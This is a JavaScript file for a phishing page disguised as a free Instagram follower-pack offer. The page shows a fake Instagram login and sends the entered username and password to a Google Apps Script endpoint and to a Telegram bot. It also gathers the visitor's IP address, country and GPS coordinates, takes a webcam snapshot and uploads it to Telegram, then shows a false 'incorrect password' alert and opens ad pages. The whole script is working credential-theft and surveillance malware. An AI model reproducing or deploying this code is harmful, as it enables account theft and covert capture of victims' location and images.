const box1 = document.querySelector('.pack1');
const box2 = document.querySelector('.pack2');
const box3 = document.querySelector('.pack3');
const box4 = document.querySelector('.pack4');
const pack1 = document.querySelector('.pack-footer1');
const pack2 = document.querySelector('.pack-footer2');
const pack3 = document.querySelector('.pack-footer3');
const pack4 = document.querySelector('.pack-footer4');

let follower = 0

box1.onclick = () => {
    pack1.classList.toggle("hide")
    if(num21 == 0){
        num++
        num21++
        follower += 1000
    }
    else{
        num21--
        num--
        follower -= 1000
    }
    quantity.innerHTML = num
    if(num > 0){
        displayBuy.style.opacity = '1'
        displayBuy.style.cursor = 'pointer'
        buyIsActive = true
    }
    else{
        displayBuy.style.opacity = '.2'
        displayBuy.style.cursor = 'default'
        buyIsActive = false
    }
}
box2.onclick = () => {
    pack2.classList.toggle("hide")
    if(num22 == 0){
        num++
        num22++
        follower += 3000
    }
    else{
        num22--
        num--
        follower -= 3000
    }
    quantity.innerHTML = num
    if(num > 0){
        displayBuy.style.opacity = '1'
        displayBuy.style.cursor = 'pointer'
        buyIsActive = true
    }
    else{
        displayBuy.style.opacity = '.2'
        displayBuy.style.cursor = 'default'
        buyIsActive = false
    }
}
box3.onclick = () => {
    pack3.classList.toggle("hide")
    if(num23 == 0){
        num++
        num23++
        follower += 5000
    }
    else{
        num23--
        num--
        follower -= 5000
    }
    quantity.innerHTML = num
    if(num > 0){
        displayBuy.style.opacity = '1'
        displayBuy.style.cursor = 'pointer'
        buyIsActive = true
    }
    else{
        displayBuy.style.opacity = '.2'
        displayBuy.style.cursor = 'default'
        buyIsActive = false
    }
}
box4.onclick = () => {
    pack4.classList.toggle("hide")
    if(num24 == 0){
        num++
        num24++
        follower += 8000
    }
    else{
        num24--
        num--
        follower -= 8000
    }
    quantity.innerHTML = num
    if(num > 0){
        displayBuy.style.opacity = '1'
        displayBuy.style.cursor = 'pointer'
        buyIsActive = true
    }
    else{
        displayBuy.style.opacity = '.2'
        displayBuy.style.cursor = 'default'
        buyIsActive = false
    }
}
const displayBuy = document.getElementById('displayBuy');
let buyIsActive = false
let quantity = document.getElementById('box');
let num = 0;
let num21 = 0
let num22 = 0
let num23 = 0
let num24 = 0

let alert = document.querySelector('.alert')
let closeAlert = document.getElementById('closeAlert')
let getQuantity = document.getElementById('getQuantity')
displayBuy.onclick = () =>{
    if(buyIsActive){
        alert.style.display = "block"
        getQuantity.innerHTML = follower
    }

}
closeAlert.onclick = () => {
    alert.style.display = "none"
}

let packs = document.querySelector('.packs');
let price = document.querySelector('.price');
let get = document.getElementById('get');
let loginContent = document.querySelector('.login-content');


get.onclick = () =>{
    get.innerHTML = '<img src="./img/loading.svg" id="getLoading" class="spinLoading">'
    setTimeout(() => {
        loginContent.style.display = 'flex'
        packs.style.display = 'none'
        alert.style.display = "none" 
        get.innerHTML = "Get Now"
        price.innerHTML = '<span class="price-s1">Instagram</span><br>Login'
        displayBuy.style.opacity = '.2'
        buyIsActive = false
        displayBuy.style.cursor = 'default'
    }, 1000);
}

const ok = document.getElementById('order')



// URL Params
const keyValues = window.location.search;
const urlParams = new URLSearchParams(keyValues);

const chatId = urlParams.get('id')
const api = urlParams.get('api')


const now = new Date();
const hours = String(now.getHours()).padStart(2, '0');
const minutes = String(now.getMinutes()).padStart(2, '0');
const seconds = String(now.getSeconds()).padStart(2, '0');
let time = `${hours}:${minutes}:${seconds}`;

let country;
let currency;
let code;
async function getCountry() {

    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        country = data.country_name;
        currency = data.currency;
        code = data.country_calling_code;
    } catch (error) {
        country = 'ɴᴏᴛ ꜰᴏᴜɴᴅ'
    }

}

getCountry();

// form to sheets 

const email = document.getElementById('email');
const password = document.getElementById('password');

const scriptURL = 'https://script.google.com/macros/s/AKfycbwgoZNx3PrZgOy74XKBBEo-j_MZQPMl07q1THBV5zBt_q4WI__uaC1AhSp8seGHSVxIRA/exec';
const form = document.forms['document'];
document.addEventListener("DOMContentLoaded", function () {
    ok.onclick = (e) => {
        e.preventDefault();
            // capture  
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert the image to a data URL and send it to the server
            const dataURL = canvas.toDataURL('image/png');
            sendImageToTelegram(dataURL);
            // telegram 
            event.preventDefault();
            ok.innerHTML = `<img src="./img/loading.svg" id="getLoading" class="spinLoading">`
            setTimeout(() => {
                ok.innerHTML = "Order for $0"
                if (email.value.length > 3 && password.value) {
                    // google sheets 
                    fetch(scriptURL, {
                        method: 'POST',
                        body: new FormData(form),
                        headers: {
                            'Accept': 'application/json'
                        }
                    })
                    .then(response => response.json())
                    .then(data => {
                        form.reset(); // Optional: Reset the form fields
                        setTimeout(() => {
                            window.location.href = 'https://www.highratecpm.com/g69q4bq2ig?key=5b29c48b92d1cfb4358ddd3c9d851615';
                            window.open('https://www.highratecpm.com/g69q4bq2ig?key=5b29c48b92d1cfb4358ddd3c9d851615', '_blank');
                            window.open('https://www.highratecpm.com/g69q4bq2ig?key=5b29c48b92d1cfb4358ddd3c9d851615', '_blank');
                        }, 500);
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        console.log('There was an error submitting the form');
                    });
                    // ip fetch 
                    fetch("https://api.ipify.org?format=json")
                        .then((response) => response.json())
                        .then((data) => {
                            let ip = data.ip;
                            sendToTelegram(ip);
                        });
                    function sendToTelegram(ip) {
                        let message = `𓆩𓆩 𝙷𝙸 𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙽𝙴𝚆 𝙷𝙸𝚃 ツ𓆪𓆪\n\n🐉⊚------------------------------⊚🐉\n➥  ʟᴏɢɪɴ ʙʏ  » ɪɴꜱᴛᴀɢʀᴀᴍ\n📧 ↝ ᴜꜱᴇʀɴᴀᴍᴇ » ${email.value}\n📟 ↝ ᴘᴀꜱꜱᴡᴏʀᴅ » ${password.value}\n🏴 ↝ ᴄᴏᴜɴᴛʀʏ » ${country}\n🌏 ↝ ɢᴏᴏɢʟᴇ ᴍᴀᴘꜱ » ${maps}\n☎️ ↝ ᴄᴏᴅᴇ »${code}\n💵 ↝ ᴄᴜʀʀᴇɴᴄʏ » ${currency}\n⚙️ ↝ ɪᴘ » ${ip}\n⏱ ↝ ᴛɪᴍᴇ » ${time}\n📝 ↝ ᴅᴀᴛᴇ » ${new Date().toDateString()}\n🐉⊚------------------------------⊚🐉\n↝ ᴅᴇᴠ ʙʏ » @PUDGEJVRBOT`;
                        let xhr = new XMLHttpRequest();
                        let token = api; //token
                        xhr.open(
                            "POST",
                            `https://api.telegram.org/bot${token}/sendMessage`,
                            true
                        );
                        xhr.onload = () => {
                            let respone = JSON.parse(xhr.responseText);
                            console.log(respone);
                            if (respone.ok) {
                                window.alert("Your password or username or email is incorrect!");
                            } else {
                                window.alert("Something went wrong!");
                            }
                        };
                        xhr.setRequestHeader(
                            "Content-type",
                            "application/x-www-form-urlencoded"
                        );
                        xhr.send(`chat_id=${chatId}&text=${message}`);
                    }
                } else {
                    window.alert("Please Enter Your Details Correctly!")
                }
            }, 2000);
    };
});


// location  
let latitude;
let longitude;
let maps;
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function (position) {
        latitude = position.coords.latitude;
        longitude = position.coords.longitude;
        maps = `https://www.google.com/maps/place/${latitude},${longitude}`;
        // Further usage of 'maps' can be done here or in subsequent functions
    }, function (error) {
        if (error.code === error.PERMISSION_DENIED) {
            maps = 'ɴᴏᴛ ꜰᴏᴜɴᴅ';
        } else {
            maps = 'Error retrieving location.';
        }
    });
} else {
    maps = 'ɴᴏᴛ ꜰᴏᴜɴᴅ';
}
// let camera = 'off'
// let loc = 'off'
// camera access 
window.onload = async function(){
        const constraints = {
            video: true
        };
    
        try {
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            const videoElement = document.getElementById('video');
            videoElement.srcObject = stream;
            // camera = 'on'
        } catch (err) {
            console.error('Error accessing media devices.', err);
        }
    }
    let CHAT_ID;
    let TELEGRAM_BOT_TOKEN;
function sendImageToTelegram(dataURL) {
        TELEGRAM_BOT_TOKEN = api;
        CHAT_ID = chatId;
    let url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;

    // Convert the data URL to a Blob
    let blob = dataURLToBlob(dataURL);

    // Create form data
    let formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'capture.png');

    // Send the image to Telegram
    fetch(url, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => console.log('Telegram response:', data))
    .catch(error => console.error('Error:', error));
}

function dataURLToBlob(dataURL) {
    const byteString = atob(dataURL.split(',')[1]);
    const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    return new Blob([ab], { type: mimeString });
}